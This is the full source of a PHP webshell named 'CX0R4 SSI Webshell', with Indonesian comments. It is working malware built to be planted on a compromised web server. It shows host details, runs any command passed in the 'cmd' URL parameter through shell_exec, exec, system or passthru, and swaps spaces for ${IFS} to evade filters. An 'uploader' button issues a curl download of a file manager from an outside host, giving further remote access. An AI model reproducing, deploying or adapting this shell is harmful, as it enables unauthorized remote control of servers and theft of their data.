<!DOCTYPE html>
<html>
<head>
<title>CX0R4 SSI Webshell</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<style type="text/css">
	/* Style untuk Latar Belakang Hitam dan Teks Putih */
	body {
		background-color: #000000;
		color: #FFFFFF;
		font-family: 'Courier New', monospace; 
		margin: 0;
		padding: 0;
		text-align: center; /* Untuk menengahkan div utama */
	}

	/* Style untuk Konten Utama Rata Tengah */
	.main-container {
		width: 80%; /* Lebar Konten */
		max-width: 900px;
		margin: 50px auto; /* Menengahkan secara horizontal */
		padding: 20px;
		background-color: #111111; /* Latar belakang sedikit abu-abu gelap agar teks menonjol */
		border: 1px solid #333;
		text-align: left; /* Mengatur teks di dalam container ke kiri */
		box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
	}
	
	/* Style untuk Input dan Button */
	.input {
		background: transparent;
		color: #FFFFFF;
		border-color: #FFFFFF;
		border-width: thin;
		border: groove;
		cursor: pointer;
		padding: 5px 10px;
	}
	
	/* Style untuk Kotak Input Teks */
	#command {
		background: rgba(255, 255, 255, 0.1);
		color: #FFFFFF;
		border: 1px solid #777;
		padding: 5px;
	}

	/* Style untuk Hasil Command (pre) - Rata Kiri */
	pre {
		white-space: pre-wrap;
		word-wrap: break-word;
		text-align: left; /* Memastikan hasil command rata kiri */
		border: 1px dashed #555;
		padding: 10px;
		background-color: rgba(20, 20, 20, 0.9);
		max-height: 400px;
		overflow: auto;
	}
	
	hr {
		border-color: #333;
	}
</style>
</head>
<body>

<div class="main-container">
	<b><font size="4"><i>CX0R4 SSI Webshell</i></font></b>
	<hr>
	System : <b id="system-info"><?php echo php_uname(); ?></b>
	<br>Current Path : <b id="current-path"><?php echo getcwd(); ?></b><br>
	MySql : <b id="mysql-status"><?php echo function_exists('mysqli_connect') ? 'Available' : 'Not Available'; ?></b>&nbsp;|&nbsp; Wget : <b id="wget-status"><?php echo function_exists('shell_exec') ? shell_exec('which wget 2>/dev/null') ? 'Available' : 'Not Available' : 'Not Available'; ?></b>&nbsp;|&nbsp; Curl : <b id="curl-status"><?php echo function_exists('curl_version') ? 'Available' : 'Not Available'; ?></b><br>
	<hr>
	
	COMMAND : 
	<input type="text" size="30" id="command" class="text" name="address1" style="width: 50%;">&nbsp;
	<button class="input" id="gas" onclick="nezcmd();">execute</button> 
	<button class="input" id="addupload" onclick="addupload();">uploader</button>
	<br><br>
	
	Executed Command : <b><font id="cmd"><?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?></font></b>
	<pre id="result"><?php
		// Eksekusi command jika ada parameter cmd
		if(isset($_GET['cmd'])) {
			$cmd = $_GET['cmd'];
			// Replace ${IFS} kembali ke spasi
			$cmd = str_replace('${IFS}', ' ', $cmd);
			
			// Eksekusi command
			if(function_exists('shell_exec')) {
				echo htmlspecialchars(shell_exec($cmd . ' 2>&1'));
			} else if(function_exists('exec')) {
				exec($cmd . ' 2>&1', $output, $return_var);
				echo htmlspecialchars(implode("\n", $output));
			} else if(function_exists('system')) {
				ob_start();
				system($cmd . ' 2>&1', $return_var);
				$output = ob_get_contents();
				ob_end_clean();
				echo htmlspecialchars($output);
			} else if(function_exists('passthru')) {
				ob_start();
				passthru($cmd . ' 2>&1', $return_var);
				$output = ob_get_contents();
				ob_end_clean();
				echo htmlspecialchars($output);
			} else {
				echo "Tidak ada fungsi eksekusi yang tersedia di server ini.";
			}
		}
	?></pre>
</div>
<script language="javascript">
/* Fungsi Command */
function nezcmd()
{
  var uri = document.getElementById('command').value;
	var rep = uri.replace(/[ ]/g,'${IFS}');
	document.location.href="?cmd="+encodeURIComponent(rep);
}

function addupload()
{
	document.getElementById('command').value = "curl -Ls raw.githubusercontent.com/prasathmani/tinyfilemanager/refs/heads/master/tinyfilemanager.php -o tinyfilemanager.php";
	document.getElementById('gas').click();
}

/* Script untuk Execute saat Tekan Enter */
var gaskan = document.getElementById("command");
gaskan.addEventListener("keyup", function(event) {
  if (event.keyCode === 13) {
    event.preventDefault();
    document.getElementById("gas").click();
  }
});
</script>

</html>